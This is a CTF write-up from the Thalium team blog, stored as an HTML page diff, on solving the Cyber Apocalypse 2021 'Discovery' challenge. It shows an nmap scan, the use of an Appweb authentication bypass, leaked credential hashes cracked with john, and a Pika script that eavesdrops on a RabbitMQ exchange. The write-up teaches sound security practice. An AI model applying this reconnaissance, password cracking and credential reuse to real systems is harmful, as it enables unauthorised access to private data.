@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="Thalium Team" />
+<meta name="description" content="Thalium blog." />
+<meta name="keywords" content="blog, tech" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.82.1" />
+
+<link rel="canonical" href="https://thalium.github.io/blog/posts/apocalypse2021-discovery/">
+<meta property="og:title" content="Cyber Apocalypse 2021 4/5 - Discovery" />
+<meta property="og:description" content="One of the least solved challenges, yet probably not the most difficult one. It is a Hardware challenge, though it is significantly different from the other challenges of this category. The first thing to spot is that when starting the challenge machine, we have access to two network services:
+
+an HTTP server, requesting an authentication
+an AMQP broker, rabbitmq
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thalium.github.io/blog/posts/apocalypse2021-discovery/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-28T12:00:03&#43;01:00" />
+<meta property="article:modified_time" content="2021-04-28T12:00:03&#43;01:00" />
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Apocalypse 2021 4/5 - Discovery"/>
+<meta name="twitter:description" content="One of the least solved challenges, yet probably not the most difficult one. It is a Hardware challenge, though it is significantly different from the other challenges of this category. The first thing to spot is that when starting the challenge machine, we have access to two network services:
+
+an HTTP server, requesting an authentication
+an AMQP broker, rabbitmq
+"/>
+
+
+<meta itemprop="name" content="Cyber Apocalypse 2021 4/5 - Discovery">
+<meta itemprop="description" content="One of the least solved challenges, yet probably not the most difficult one. It is a Hardware challenge, though it is significantly different from the other challenges of this category. The first thing to spot is that when starting the challenge machine, we have access to two network services:
+
+an HTTP server, requesting an authentication
+an AMQP broker, rabbitmq
+"><meta itemprop="datePublished" content="2021-04-28T12:00:03&#43;01:00" />
+<meta itemprop="dateModified" content="2021-04-28T12:00:03&#43;01:00" />
+<meta itemprop="wordCount" content="540">
+<meta itemprop="keywords" content="CTF,Writeup,CyberApocalypse2021," />
+
+<link rel="stylesheet" href="https://thalium.github.io/blog/css/layout.css" />
+
+
+<link rel="stylesheet" href="https://thalium.github.io/blog/css/default-dark.css" />
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-141692648-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<title>
+
+
+     Cyber Apocalypse 2021 4/5 - Discovery 
+
+</title>
+
+
+
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['∳', '∳']],   
+      displayMath: [['∳∳','∳∳']],
+      processEscapes: true,
+    },
+    svg: {
+      fontCache: 'global'
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js">
+</script>
+
+</head>
+
+
+<body>
+  <style>
+  @font-face {
+    font-family: 'days_one';
+    src: url('/blog/days_one.ttf') format('truetype');
+  }
+  .siteTitle {
+    margin-top: 24px;
+  }
+  .siteTitle img {
+    display: inline-block;
+    vertical-align: middle;
+    margin-top: -24px;
+    margin-right: -10px;
+  }
+  .siteTitle span {
+    font-family: 'days_one', Fallback, sans-serif;
+    color: white;
+    font-size: 160%;
+  }
+  </style>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="https://thalium.github.io/blog/">
+        <img src="https://thalium.github.io/blog/shard_only_no_background.png" width=12%></img>
+        <span>THALIUM</span>
+      </a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="https://thalium.github.io/blog/posts/"><div class="nav-item-title">Posts</div></a>
+    
+
+  </nav>
+
+  
+<div class="social-links-header">
+
+  
+  <a href="mailto:thalium.team@gmail.com"><div class="social-link">Email</div></a>
+  
+
+  
+  <a href="https://github.com/thalium" target="_blank"><div class="social-link">Github</div></a>
+  
+
+  
+
+  
+  <a href="https://twitter.com/thalium_team" target="_blank"><div class="social-link">Twitter</div></a>
+  
+
+  
+
+</div>
+
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> Cyber Apocalypse 2021 4/5 - Discovery </h1>
+    <div class="content"> <p>One of the least solved challenges, yet probably not the most difficult one. It is a Hardware challenge, though it is significantly different from the other challenges of this category. The first thing to spot is that when starting the challenge machine, we have access to two network services:</p>
+<ul>
+<li>an HTTP server, requesting an authentication</li>
+<li>an AMQP broker, <code>rabbitmq</code></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -sT -p 30476,30042 -sV -sC -n -Pn 138.68.182.108
+PORT      STATE SERVICE VERSION
+30042/tcp open  http	?
+...
+30476/tcp open  amqp    RabbitMQ 3.8.2 <span style="color:#f92672">(</span>0-9<span style="color:#f92672">)</span>
+| amqp-info: 
+|   capabilities: 
+|     publisher_confirms: YES
+|     exchange_exchange_bindings: YES
+|     basic.nack: YES
+|     consumer_cancel_notify: YES
+|     connection.blocked: YES
+|     consumer_priorities: YES
+|     authentication_failure_close: YES
+|     per_consumer_qos: YES
+|     direct_reply_to: YES
+|   cluster_name: rabbit@hwcadiscovery-9130-689c6f9d5d-sbf2f
+|   copyright: Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2007-2019 Pivotal Software, Inc.
+|   information: Licensed under the MPL 1.1. Website: https://rabbitmq.com
+|   platform: Erlang/OTP 22.2.7
+|   product: RabbitMQ
+|   version: 3.8.2
+|   mechanisms: PLAIN AMQPLAIN
+|_  locales: en_US
+</code></pre></div><p>The web part is rather awkward, as it keeps returning <code>HTTP 401</code> asking for authentication credentials. The message bus part is not that friendly either, as it requires to authenticate too. Crawling has not helped a lot, and bruteforcing looks rather inefficient for a CTF. <strong>So what else to do ?</strong></p>
+<p>We picked an HTTP response and took a closer look at it:</p>
+<pre><code>...
+WWW-Authenticate: realm=&quot;appweb_control_panel&quot;,...,opaque=&quot;799d5&quot;...
+...
+</code></pre><p>Googling <code>appweb</code> is not the safest bet, but googling <code>opaque=&quot;799d5&quot;</code> rapidly returns a <a href="https://www.programmersought.com/article/16096870398/">good candidate</a>.</p>
+<p>Digging a bit, we find out two more things:</p>
+<ul>
+<li>an exploit, in Python, which is an authentication bypass, targeting embedthis appweb, which looks promising</li>
+<li>a github reference to the <a href="https://github.com/embedthis/appweb-gpl/blob/master/src/http/httpLib.c#L6063">opaque=&ldquo;799d5&rdquo;</a></li>
+</ul>
+<p>Running the exploit against the target works, and allows to access to the content associated with <code>/</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Plane Control Panel
+Panel which monitors the sensor readings and other controls.
+
+List of sensors
+Perimeter Detection
+Radiation Control
+Location Tracker
+RabbitMQ Access
+Exchange    Type    Username    Password Hash    Host    Routing Key    Queue
+Direct    anthony_davis    89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1    /        
+Base    Topic    leo    27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99    / 
+</code></pre></div><p>Recalling that we have access to a rabbitmq instance, we can now turn those credentials to access to the AMQP broker, and possibly retrieve some messages.</p>
+<p>Starting <code>john</code> yields <code>SHA256('winniethepooh') = 89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1</code> in a snap. The other hash remains uncracked until today.</p>
+<p>We can verify that we can access to the AMQP broker using these credentials. The lock to the AMQP broker has gone.</p>
+<p>The last step is to peek into the messages flow, using <a href="https://pika.readthedocs.io/en/stable/">Pika</a> as an AMQP client implementation:</p>
+<ol>
+<li>Connect and authenticate using <code>PlainCredentials</code></li>
+<li>Create a queue which will store messages we shall receive</li>
+<li>Bind this queue to the exchange defined in the web leaked data, &lsquo;Base&rsquo;, and asking pass every routing key to this queue, using &lsquo;#&rsquo;.</li>
+</ol>
+<p>The associated concepts can be found in <a href="https://www.rabbitmq.com/tutorials/tutorial-five-python.html">rabbitmq documentation associated with topics</a>.</p>
+<p>The script below will yield the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pika <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> time
+<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;138.68.182.108&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30476</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(username, password):
+  creds <span style="color:#f92672">=</span> PlainCredentials(username, password)
+  params <span style="color:#f92672">=</span> ConnectionParameters(TARGET, PORT, <span style="color:#e6db74">&#39;/&#39;</span>, creds)
+  conn <span style="color:#f92672">=</span> BlockingConnection(params)
+  <span style="color:#66d9ef">return</span> conn
+
+conn <span style="color:#f92672">=</span> connect(<span style="color:#e6db74">&#39;anthony_davis&#39;</span>, <span style="color:#e6db74">&#39;winniethepooh&#39;</span>)
+<span style="color:#66d9ef">assert</span>(conn)
+<span style="color:#66d9ef">print</span>(conn)
+
+channel <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>channel()
+
+result <span style="color:#f92672">=</span> channel<span style="color:#f92672">.</span>queue_declare(<span style="color:#e6db74">&#39;&#39;</span>, exclusive<span style="color:#f92672">=</span>True)
+queue_name <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>method<span style="color:#f92672">.</span>queue
+
+channel<span style="color:#f92672">.</span>queue_bind(exchange<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Base&#39;</span>, queue<span style="color:#f92672">=</span>queue_name, routing_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">callback</span>(ch, method, properties, body):
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; [x] Received </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> body<span style="color:#f92672">.</span>decode())
+    time<span style="color:#f92672">.</span>sleep(body<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; [x] Done&#34;</span>)
+    ch<span style="color:#f92672">.</span>basic_ack(delivery_tag<span style="color:#f92672">=</span>method<span style="color:#f92672">.</span>delivery_tag)
+
+channel<span style="color:#f92672">.</span>basic_consume(queue<span style="color:#f92672">=</span>queue_name, on_message_callback<span style="color:#f92672">=</span>callback, auto_ack<span style="color:#f92672">=</span>True)
+
+channel<span style="color:#f92672">.</span>start_consuming()
+</code></pre></div><p>The flag shows up: <code>CHTB{1_h4v3_n0n4m3@_@}</code>.</p> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+            
+<div class="tags">
+  
+    
+      <div class="tag">
+        <a href="https://thalium.github.io/blog/tags/ctf">#CTF</a>
+      </div>
+    
+      <div class="tag">
+        <a href="https://thalium.github.io/blog/tags/writeup">#Writeup</a>
+      </div>
+    
+      <div class="tag">
+        <a href="https://thalium.github.io/blog/tags/cyberapocalypse2021">#CyberApocalypse2021</a>
+      </div>
+    
+  
+</div>
+
+    <span class="date">
+      2021-04-28
+      <span class="author">
+        by 
+          Thalium team
+          
+        </span>
+    </span>
+    
+  </div>
+</footer>
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+  <a href="mailto:thalium.team@gmail.com"><div class="social-link">Email</div></a>
+  
+
+  
+  <a href="https://github.com/thalium" target="_blank"><div class="social-link">GitHub</div></a>
+  
+
+  
+
+  
+  <a href="https://twitter.com/thalium_team" target="_blank"><div class="social-link">Twitter</div></a>
+  
+
+  
+
+  <div class="social-link">
+  <a href="https://thalium.github.io/blog/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright"> Copyright (c) 2020, all rights reserved. </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</div> 
+
+</body>
+</html>
+
